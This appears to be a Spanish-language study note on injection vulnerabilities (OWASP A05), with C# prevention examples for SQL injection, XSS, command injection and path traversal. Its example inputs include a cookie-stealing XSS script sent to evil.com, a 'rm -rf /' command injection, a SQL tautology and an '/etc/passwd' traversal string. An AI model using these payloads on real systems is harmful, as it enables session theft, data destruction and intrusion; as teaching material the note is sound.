# Injection (Inyección de Código)

> [!info] OWASP Top 10:2025
> **A05:Injection** — Baja de #3 a #5 pero sigue siendo fundamental. SQLi está en declive gracias a ORMs, pero XSS y SSTI siguen siendo relevantes.

## QUÉ es

Un ataque donde el atacante **inyecta código malicioso** que tu aplicación ejecuta sin querer. Explota la falta de validación de inputs para manipular el comportamiento del sistema.

## Tipos principales

### SQL Injection

```
Input del usuario: ' OR 1=1 --
Query resultante:  SELECT * FROM users WHERE name='' OR 1=1 --'
                                         ↑ Devuelve TODOS los usuarios
```

| Variantes | Descripción |
|-----------|-------------|
| **Classic** | Input directo en query |
| **Blind** | No ve resultados pero infiere por comportamiento |
| **Union-based** | Usa UNION para extraer datos de otras tablas |

### XSS (Cross-Site Scripting)

```
Input: <script>document.location='http://evil.com?c='+document.cookie</script>
Result: Se ejecuta JS malicioso en el navegador de la víctima
```

| Tipo | Cómo se inyecta | Ejemplo |
|------|----------------|---------|
| **Reflected** | Parámetro de URL | `?q=<script>...</script>` |
| **Stored** | Guardado en BD | Comentario con `<script>` |
| **DOM-based** | Manipulación del DOM | `document.write(userInput)` |

### Command Injection

```
Input: ; rm -rf /
Command: ping 127.0.0.1; rm -rf /
              ↑ Ejecuta comando malicioso en el servidor
```

### Path Traversal

```
Input: ../../../etc/passwd
Result: Acceso a archivos fuera del directorio permitido
```

## POR QUÉ ocurre

| Causa | Ejemplo | OWASP |
|-------|---------|-------|
| Concatenar strings en queries | `"SELECT * FROM users WHERE id=" + userId` | A05 |
| No validar inputs | Aceptar cualquier dato sin sanitizar | A05 |
| Mostrar error details al usuario | Stack trace visible = info para el atacante | A02 |
| No usar parameterized queries | Query con interpolación de strings | A05 |

## CÓMO prevenirlo

### SQL Injection

```csharp
// ❌ MAL — concatenación
var query = $"SELECT * FROM Users WHERE Id = {userId}";

// ✅ BIEN — parameterized query (LINQ genera SQL parametrizado)
var user = await context.Users
    .Where(u => u.Id == userId)
    .FirstOrDefaultAsync();
```

> **Regla:** Si usas Entity Framework, LINQ ya genera parameterized queries automáticamente. El peligro es `FromSqlRaw()` con interpolación.

### XSS

```csharp
// ❌ MAL — mostrar input sin sanitizar
return Content(userInput);

// ✅ BIEN — HTML encoding
return Content(HtmlEncoder.Default.Encode(userInput));
```

### Command Injection

```csharp
// ❌ MAL — pasar input directamente a un proceso
Process.Start("ping", userInput);

// ✅ BIEN — validar y sanitizar input
var validIP = IPAddress.Parse(userInput);
Process.Start("ping", validIP.ToString());
```

### Path Traversal

```csharp
// ❌ MAL
var path = Path.Combine(baseDir, userFile);

// ✅ BIEN — verificar que la ruta resuelta está dentro del directorio permitido
var fullPath = Path.GetFullPath(Path.Combine(baseDir, userFile));
if (!fullPath.StartsWith(baseDir))
    throw new InvalidOperationException("Path not allowed");
```

## CUÁNDO preocuparte

- **SIEMPRE** que recibas input del usuario
- En endpoints de login, búsqueda, registro
- En parámetros de URL
- En headers HTTP
- En archivos subidos
- En datos de formularios

## DÓNDE proteger

| Capa | Acción | Herramienta |
|------|--------|------------|
| API | Validar y sanitizar todos los inputs | FluentValidation |
| Service | Validar reglas de negocio | Lógica custom |
| Repository | Usar parameterized queries | Entity Framework |
| BD | Permisos mínimos (no usar SA) | SQL Server roles |
| Pipeline | SAST detecta patrones inseguros | Semgrep, SonarQube |

## Herramientas de detección

| Herramienta | Tipo | Cuándo | Costo |
|------------|------|--------|-------|
| .NET Analyzers | SAST | En el IDE y CI | Gratis |
| SonarQube | SAST | En el pipeline | Community gratis |
| Semgrep | SAST | En el CI | OSS gratis |
| OWASP ZAP | DAST | Contra la app corriendo | Gratis |
| Entity Framework | Prevención | ORM ya usa parameterized queries | Gratis |

## Errores comunes

| Error | Causa | Solución |
|-------|-------|----------|
| `SqlException` con input malicioso | Query no parametrizada | Usar LINQ o `FromSqlInterpolated` |
| Contenido XSS renderizado | No se escapó el output | Usar `HtmlEncoder` |
| `FileNotFoundException` con `../` | No se validó la ruta | Verificar path completo |

## Referencia
- [[00-Index]]
- [[Patrones/Anti-Patrones-Seguridad]]
- [[Introduccion-AppSec-DevSecOps]]

---
#seguridad #injection #sqli #xss #owasp #sast
